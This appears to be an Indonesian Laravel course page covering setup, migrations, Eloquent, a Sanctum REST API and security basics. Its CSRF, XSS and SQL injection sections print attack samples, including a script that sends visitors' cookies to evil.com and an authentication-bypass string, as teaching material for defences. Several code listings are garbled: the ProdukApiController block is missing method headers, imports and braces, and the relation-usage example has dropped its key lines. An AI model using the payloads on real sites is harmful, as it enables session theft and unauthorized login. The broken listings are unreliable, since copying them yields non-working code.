Minggu 1: Instalasi, CRUD & REST API Laravel

Sebelum masuk ke CRUD dan REST API, siapkan dulu environment Laravel-nya. Ada dua jalur yang bisa dipilih — XAMPP (Windows, serba GUI, paling cepat untuk pemula) atau WSL (Linux di dalam Windows, lebih mirip environment production). Pilih salah satu, tidak perlu dua-duanya.

Persyaratan

KebutuhanVersi MinimumFungsi
PHP8.2+Menjalankan Laravel
Composer2.xManajer dependency PHP, dipakai untuk instal Laravel
Ekstensi PHP—mbstring, xml, curl, zip, bcmath, pdo_mysql
MySQL/MariaDB8.x / 10.xDatabase (opsional di awal, wajib untuk migration)
Node.js18+Compile asset frontend (Vite) — opsional untuk API-only
Belum Tahu Mau Pilih yang Mana?
XAMPP kalau baru mulai belajar Laravel dan ingin GUI (phpMyAdmin, Apache tinggal klik start). WSL kalau sudah nyaman dengan terminal Linux dan ingin environment yang mirip server production sungguhan.

Install Laravel via XAMPP

Langkah 1 — Install XAMPP

Download XAMPP (sudah termasuk PHP, Apache, MySQL) dari apachefriends.org, pilih versi dengan PHP 8.2 ke atas, lalu install seperti biasa (default C:\xampp).

Langkah 2 — Tambahkan PHP ke PATH

Supaya perintah php dan composer bisa dipanggil dari terminal manapun, tambahkan folder PHP XAMPP ke environment variable PATH Windows.

Windows — Edit Environment Variables
# Search "Environment Variables" di Start Menu →
# Edit the system environment variables → Environment Variables
# Pilih "Path" di User variables → Edit → New
C:\xampp\php
Terminal (buka baru setelah edit PATH)
php -v
# harus muncul: PHP 8.2.x (cli) ...

Langkah 3 — Install Composer

Download Composer-Setup.exe dari getcomposer.org, jalankan installer — secara otomatis mendeteksi PHP XAMPP di PATH.

Terminal
composer -V
# harus muncul: Composer version 2.x.x

Langkah 4 — Buat Project Laravel di dalam htdocs

Terminal
cd C:\xampp\htdocs
composer create-project laravel/laravel laravel-crud-app
Kenapa di dalam htdocs?
Apache XAMPP hanya melayani file di dalam folder htdocs. Kalau project dibuat di luar folder ini, kamu tetap bisa menjalankannya lewat php artisan serve (lihat bagian Menjalankan Project), tapi tidak bisa diakses lewat Apache/virtual host.

Langkah 5 — Hubungkan ke MySQL XAMPP

Start module Apache dan MySQL di XAMPP Control Panel, lalu buat database baru lewat phpMyAdmin (http://localhost/phpmyadmin).

.env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel_crud_app
DB_USERNAME=root
DB_PASSWORD=
Default XAMPP
User root di MySQL XAMPP secara default tidak punya password — kosongkan saja DB_PASSWORD.

Install Laravel via WSL

WSL (Windows Subsystem for Linux) menjalankan Ubuntu asli di dalam Windows — cocok kalau ingin environment development yang mirip server production (Linux).

sudo apt install php php-cli php-mbstring php-xml php-bcmath php-curl php-zip unzip -y

Terminal Ubuntu (WSL)
curl -sS https://getcomposer.org/installer | php

Migration

Migration adalah version control untuk database — mendefinisikan struktur tabel dalam kode PHP agar bisa dijalankan di mesin apapun secara konsisten.

Migration 1 — Buat Tabel Produks

Terminal
php artisan make:migration create_produks_table
database/migrations/..._create_produks_table.php
public function up(): void
{
    Schema::create('produks', function (Blueprint $table) {
        $table->id();
        $table->string('nama_produk');
        $table->integer('harga');
        $table->integer('stok');
        $table->timestamps();
    });
}
public function down(): void
{
    Schema::dropIfExists('produks');
}

Migration 2 — Tambah Kolom Deskripsi

Jika perlu menambah kolom ke tabel yang sudah ada, buat migration baru — jangan edit migration lama yang sudah dijalankan.

Terminal
php artisan make:migration add_deskripsi_to_produks_table
database/migrations/..._add_deskripsi_to_produks_table.php
public function up(): void
{
    Schema::table('produks', function (Blueprint $table) {
        $table->text('deskripsi')->nullable()->after('stok');
    });
}
public function down(): void
{
    Schema::table('produks', function (Blueprint $table) {
        $table->dropColumn('deskripsi');
    });
}

Jalankan Migration

Terminal
php artisan migrate           # jalankan semua yang belum dijalankan
php artisan migrate:rollback  # batalkan migration terakhir
php artisan migrate:fresh     # reset dan jalankan ulang semua

Model Produk

Model adalah representasi tabel database dalam PHP class. Eloquent ORM memudahkan interaksi dengan database tanpa menulis SQL manual.

Terminal
php artisan make:model Produk
app/Models/Produk.php
<?php
namespace App\Models;
use Illuminate\Database\Eloquent\Model;

class Produk extends Model
{
    protected $fillable = [
        'nama_produk', 'harga', 'stok', 'deskripsi',
    ];
}
Mengapa $fillable Penting?
Melindungi dari mass assignment vulnerability — hanya kolom yang terdaftar di $fillable yang bisa diisi via create() atau update(). Tanpa ini, penyerang bisa menyuntikkan field berbahaya seperti is_admin=true.

Nama tabelsnake_case, plural (otomatis)produks
Primary keyid (otomatis)id
Timestampscreated_at, updated_at (otomatis)—

Resource Controller

Terminal
php artisan make:controller ProdukController --resource
app/Http/Controllers/ProdukController.php
<?php
namespace App\Http\Controllers;
use App\Models\Produk;
use Illuminate\Http\Request;

class ProdukController extends Controller
{
    // GET /produk — tampilkan semua produk
    public function index()
    {
        $produks = Produk::all();
        return view('produk.index', compact('produks'));
    }

    // GET /produk/create — tampilkan form tambah
    public function create()
    {
        return view('produk.create');
    }

    // POST /produk — simpan produk baru
    public function store(Request $request)
    {
        $request->validate([
            'nama_produk' => 'required',
            'harga'       => 'required|numeric|min:1',
            'stok'        => 'required|numeric|min:0',
            'deskripsi'   => 'nullable|max:500',
        ]);
        Produk::create($request->all());
        return redirect()->route('produk.index')
            ->with('success', 'Produk berhasil ditambahkan.');
    }

    // GET /produk/{id}/edit — form edit
    public function edit(Produk $produk)
    {
        return view('produk.edit', compact('produk'));
    }

    // PUT /produk/{id} — update produk
    public function update(Request $request, Produk $produk)
    {
        $request->validate([
            'nama_produk' => 'required',
            'harga'       => 'required|numeric|min:1',
            'stok'        => 'required|numeric|min:0',
            'deskripsi'   => 'nullable|max:500',
        ]);
        $produk->update($request->all());
        return redirect()->route('produk.index')
            ->with('success', 'Produk berhasil diperbarui.');
    }

    // DELETE /produk/{id} — hapus produk
    public function destroy(Produk $produk)
    {
        $produk->delete();
        return redirect()->route('produk.index')
            ->with('success', 'Produk berhasil dihapus.');
    }
}
Route Model Binding
Parameter Produk $produk di edit, update, destroy — Laravel otomatis mencari record dari {id} di URL. Jika tidak ditemukan, Laravel otomatis mengembalikan 404.

Query Dasar Eloquent

Eloquent adalah ORM (Object-Relational Mapping) bawaan Laravel. Selain create(), update(), dan delete() yang sudah dipakai di CRUD Produk, berikut method query yang paling sering dibutuhkan.

MethodFungsi
Produk::all()Ambil semua record
Produk::find($id)Ambil satu record by primary key, null jika tidak ada
Produk::findOrFail($id)Sama seperti find(), tapi lempar 404 jika tidak ada
Produk::where('stok', '>', 0)->get()Filter dengan kondisi
Produk::orderBy('harga', 'desc')->first()Urutkan lalu ambil satu teratas
Produk::where('nama_produk', 'like', "%$q%")->paginate(10)Pencarian + pagination
Query Builder Malas (Lazy)
Eloquent query baru benar-benar dijalankan ke database saat dipanggil method eksekusi seperti get(), first(), find(), atau count(). Sebelum itu, where() hanya menyusun query di memori.

Relasi Antar Model

Aplikasi nyata jarang punya satu tabel berdiri sendiri. Misalnya setiap Produk punya satu Kategori. Eloquent merepresentasikan relasi ini sebagai method di dalam model, bukan JOIN manual.

Migration Tabel Kategori & Foreign Key

Terminal
php artisan make:migration create_kategoris_table
php artisan make:migration add_kategori_id_to_produks_table
database/migrations/..._add_kategori_id_to_produks_table.php
public function up(): void
{
    Schema::table('produks', function (Blueprint $table) {
        $table->foreignId('kategori_id')
              ->nullable()
              ->constrained()
              ->nullOnDelete();   // kategori dihapus → produk tidak ikut terhapus
    });
}

Model — belongsTo & hasMany

app/Models/Produk.php
class Produk extends Model
{
    protected $fillable = ['nama_produk', 'harga', 'stok', 'deskripsi', 'kategori_id'];

    // Satu produk milik satu kategori
    public function kategori()
    {
        return $this->belongsTo(Kategori::class);
    }
}
app/Models/Kategori.php
class Kategori extends Model
{
    protected $fillable = ['nama_kategori'];

    // Satu kategori punya banyak produk
    public function produks()
    {
        return $this->hasMany(Produk::class);
    }
}

Memakai Relasi

// Akses seperti property biasa — Eloquent yang jalankan query di belakang layar
$produk = Produk::find(1);

// Kebalikannya — semua produk milik satu kategori
$kategori = Kategori::find(1);

Masalah N+1 Query

N+1 query terjadi saat kode menjalankan 1 query untuk ambil data utama, lalu 1 query tambahan per baris untuk ambil data relasinya — total N+1 query padahal cukup 2.

app/Http/Controllers/Api/ProdukApiController.php — Bermasalah
public function index()
{
    $produks = Produk::all();   // 1 query

    return view('produk.index', [
        'produks' => $produks,
    ]);
}
resources/views/produk/index.blade.php
@foreach ($produks as $p)
  {{ $p->nama_produk }} - {{ $p->kategori->nama_kategori }}
  {{-- setiap $p->kategori di sini memicu 1 query baru --}}
@endforeach
100 Produk = 101 Query
1 query untuk Produk::all(), ditambah 100 query terpisah — satu untuk setiap $p->kategori yang diakses di dalam loop. Semakin banyak data, semakin lambat halaman dimuat.

Mendeteksi N+1

Aktifkan query log sementara untuk melihat berapa banyak query yang benar-benar dijalankan, atau pakai package barryvdh/laravel-debugbar saat development.

Tinker / kode sementara
DB::listen(function ($query) {
    logger($query->sql, $query->bindings);
});

Eager Loading

Solusinya: beri tahu Eloquent di awal relasi apa saja yang akan dipakai, dengan with(). Laravel akan menggabungkannya menjadi query tambahan yang jumlahnya tetap (tidak tergantung jumlah baris).

app/Http/Controllers/Api/ProdukApiController.php — Diperbaiki
public function index()
{
    // 2 query total: 1 untuk produk, 1 untuk semua kategori terkait
    $produks = Produk::with('kategori')->get();

    return response()->json(['success' => true, 'data' => $produks]);
}

// Beberapa relasi sekaligus
$produks = Produk::with(['kategori', 'ulasan'])->get();

// Nested — relasi dari relasi
$produks = Produk::with('kategori.produks')->get();
TeknikKapan Dipakai
with('relasi')Eager load standar — hampir selalu dipakai relasi ini
load('relasi')Eager load setelah data sudah diambil (lazy eager loading)
withCount('relasi')Hitung jumlah relasi tanpa memuat semua datanya, misal $kategori->produks_count
Aturan Praktis
Setiap kali kamu mengakses relasi di dalam @foreach / foreach, cek dulu apakah relasi tersebut sudah di-eager-load dengan with() di query awal.

Indexing Dasar

Index adalah struktur data tambahan yang mempercepat pencarian baris tanpa harus memindai seluruh tabel (full table scan). Trade-off-nya: index mempercepat SELECT tapi sedikit memperlambat INSERT/UPDATE karena index juga harus diperbarui.

Kolom yang Sebaiknya Diberi Index

  • Foreign key — contoh kategori_id (Laravel otomatis meng-index-nya lewat foreignId()->constrained())
  • Kolom yang sering dipakai di WHERE, misal email, status
  • Kolom yang sering dipakai di ORDER BY, misal created_at
  • Kolom unik seperti email pada tabel users
database/migrations/..._create_produks_table.php
Schema::create('produks', function (Blueprint $table) {
    $table->id();
    $table->string('nama_produk');
    $table->integer('harga');
    $table->integer('stok');
    $table->string('status')->default('aktif')->index();   // single-column index
    $table->timestamps();

    // composite index — untuk query yang filter dua kolom sekaligus
    $table->index(['kategori_id', 'status']);
});

Menambah Index ke Tabel yang Sudah Ada

Terminal
php artisan make:migration add_index_to_produks_table
public function up(): void
{
    Schema::table('produks', function (Blueprint $table) {
        $table->index('nama_produk');
    });
}
public function down(): void
{
    Schema::table('produks', function (Blueprint $table) {
        $table->dropIndex(['nama_produk']);
    });
}

Cek Query Lambat dengan EXPLAIN

Tinker
DB::select('EXPLAIN SELECT * FROM produks WHERE status = ?', ['aktif']);
// perhatikan kolom "key" pada hasil — jika NULL, index tidak dipakai
Jangan Asal Index Semua Kolom
Index yang berlebihan memperlambat proses tulis (insert/update) dan menambah ukuran database. Tambahkan index hanya pada kolom yang benar-benar sering di-WHERE, ORDER BY, atau dijadikan foreign key.

Pengenalan REST API

REST API (Representational State Transfer Application Programming Interface) memungkinkan aplikasi yang berbeda saling berkomunikasi melalui HTTP. Server hanya mengembalikan data (biasanya JSON), bukan HTML.

Web TradisionalREST API
Server kirim HTML lengkapServer kirim data JSON saja
Browser render tampilanClient (app/frontend) render tampilan
Satu platform (web)Multi-platform (web, mobile, IoT)
Session & cookie authToken-based auth (Sanctum, JWT)

Format Response JSON

{
  "success": true,
  "data": [
    { "id": 1, "nama_produk": "Laptop", "harga": 8000000, "stok": 10 },
    { "id": 2, "nama_produk": "Mouse",  "harga": 150000,  "stok": 50 }
  ]
}

Cara Kerja REST API dengan Sanctum

Client                          Laravel API
  |                                |
  |-- POST /api/login ----------> |
  |                                | validasi user + password
  |<-- { token: "abc123..." } ---|
  |                                |
  |-- GET /api/produk ----------> |
  |   Authorization: Bearer abc123 | cek token via Sanctum
  |<-- { data: [...] } ----------|
  1. Client kirim username & password ke endpoint login
  2. Server validasi kredensial, buat token Sanctum, kirim balik ke client
  3. Client simpan token (localStorage / secure storage)
  4. Setiap request berikutnya sertakan token di header Authorization: Bearer {token}
  5. Sanctum middleware validasi token, lanjutkan request jika valid

Auth Controller

Terminal
php artisan make:controller Api/AuthController
app/Http/Controllers/Api/AuthController.php
<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $request->validate([
            'name'     => 'required|string|max:255',
            'email'    => 'required|email|unique:users',
            'password' => 'required|min:8|confirmed',
        ]);

        $user = User::create([
            'name'     => $request->name,
            'email'    => $request->email,
            'password' => Hash::make($request->password),
        ]);

        $token = $user->createToken('auth_token')->plainTextToken;

        return response()->json([
            'success' => true,
            'token'   => $token,
            'user'    => $user,
        ], 201);
    }

    public function login(Request $request)
    {
        $request->validate([
            'email'    => 'required|email',
            'password' => 'required',
        ]);

        $user = User::where('email', $request->email)->first();

        if (!$user || !Hash::check($request->password, $user->password)) {
            return response()->json([
                'success' => false,
                'message' => 'Email atau password salah.',
            ], 401);
        }

        $token = $user->createToken('auth_token')->plainTextToken;

        return response()->json([
            'success' => true,
            'token'   => $token,
            'user'    => $user,
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();

        return response()->json([
            'success' => true,
            'message' => 'Berhasil logout.',
        ]);
    }

    public function me(Request $request)
    {
        return response()->json($request->user());
    }
}

<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;

class ProdukApiController extends Controller

    {
        return response()->json([

        ]);
    }

    public function show(Produk $produk)
    {
        return response()->json([
            'success' => true,
            'data'    => $produk,
        ]);
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'nama_produk' => 'required|string|max:255',
            'harga'       => 'required|numeric|min:1',
            'stok'        => 'required|integer|min:0',
            'deskripsi'   => 'nullable|string|max:500',
        ]);

        $produk = Produk::create($validated);

        return response()->json([
            'success' => true,
            'data'    => $produk,
        ], 201);
    }

        $validated = $request->validate([
            'nama_produk' => 'required|string|max:255',
            'harga'       => 'required|numeric|min:1',
            'stok'        => 'required|integer|min:0',
            'deskripsi'   => 'nullable|string|max:500',
        ]);

        $produk->update($validated);

        return response()->json([
            'success' => true,
            'data'    => $produk,
        ]);
    }

    {
        $produk->delete();

        return response()->json([

            'message' => 'Produk berhasil dihapus.',
        ]);

Keamanan: CSRF Protection

CSRF (Cross-Site Request Forgery) adalah serangan dimana website jahat memaksa browser korban melakukan request ke aplikasi kamu tanpa sepengetahuan korban.

Skenario Serangan

1. User login ke bank.com (session aktif di browser)
2. User buka evil.com yang berisi:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="1000000">
     <input name="to" value="hacker_account">
   </form>
   <script>document.forms[0].submit()</script>
3. Browser kirim request ke bank.com dengan cookie session user
4. Transfer berhasil tanpa user tahu

Cara Laravel Mencegah CSRF

Laravel menyertakan token acak di setiap form. Server menolak request POST yang tidak menyertakan token yang cocok.

Blade View (web form)
<form method="POST" action="/transfer">
  @csrf   <!-- menghasilkan: <input type="hidden" name="_token" value="abc123..."> -->
  ...
</form>

Keamanan: XSS Prevention

XSS (Cross-Site Scripting) adalah serangan dimana penyerang menyuntikkan script berbahaya ke halaman web yang dilihat user lain.

Skenario Serangan

Penyerang input nama produk: <script>document.location='evil.com?c='+document.cookie</script>

Kalau tidak di-escape:
  <td><script>... script jalan, cookie user dicuri </script></td>

Kalau di-escape (aman):
  <td>&lt;script&gt;...&lt;/script&gt;</td>   <!-- ditampilkan sebagai teks biasa -->

Cara Laravel Mencegah XSS

SituasiCara AmanCara Berbahaya
Tampilkan variabel di Blade {{ $var }} (auto-escape) {!! $var !!} (raw, tidak di-escape)
Input dari user Gunakan validate() sebelum simpan Langsung simpan tanpa validasi
Response API response()->json($data) (auto-escape JSON) Echo raw HTML dari user input
Hindari {!! !!}
Hanya gunakan {!! $var !!} jika kamu 100% yakin variabel berasal dari sumber terpercaya (misalnya konten HTML yang kamu buat sendiri di CMS internal). Jangan pernah gunakan untuk output dari input user.

Keamanan: SQL Injection

SQL Injection adalah serangan dimana penyerang menyisipkan perintah SQL berbahaya melalui input form untuk memanipulasi query database.

Skenario Serangan

Input email login: admin' OR '1'='1' --

Query yang terbentuk (tanpa proteksi):
  SELECT * FROM users WHERE email = 'admin' OR '1'='1' --' AND password = '...'

Karena '1'='1' selalu TRUE, semua user dikembalikan.
Penyerang bisa login sebagai user manapun tanpa password!

Cara Laravel Mencegah SQL Injection

Eloquent ORM dan Query Builder menggunakan prepared statements secara otomatis — input user tidak pernah langsung dimasukkan ke SQL string.

CaraAman?Contoh
Eloquent ORM ✅ Aman Produk::where('nama', $input)->get()
Query Builder ✅ Aman DB::table('produk')->where('nama', $input)->get()
Raw query dengan binding ✅ Aman DB::select('SELECT * FROM produk WHERE id = ?', [$id])
Raw query tanpa binding ❌ Berbahaya DB::select("SELECT * WHERE id = $id")
Eloquent Aman by Default
Selama menggunakan Eloquent atau Query Builder dengan parameter binding, Laravel otomatis mencegah SQL injection. Hindari menggabungkan string user input langsung ke query SQL mentah.

REST API → JWT

Sanctum cocok untuk aplikasi first-party (SPA/mobile buatan sendiri) karena tokennya disimpan di database dan gampang di-revoke. Kalau API kamu perlu dikonsumsi pihak ketiga atau butuh token stateless (tidak menyentuh DB tiap request), pakai JWT (JSON Web Token) sebagai alternatif.

AspekSanctumJWT
Penyimpanan tokenTabel personal_access_tokensTidak disimpan — self-contained
Revoke tokenMudah, hapus baris di DBButuh strategi tambahan (blacklist/short expiry)
Cocok untukSPA & mobile first-partyAPI publik, integrasi multi-service
Lanjutkan ke Workshop JWT
Implementasi lengkap — install package, konfigurasi guard, JwtAuthController, sampai refresh token — didokumentasikan terpisah di Workshop JWT Authentication.
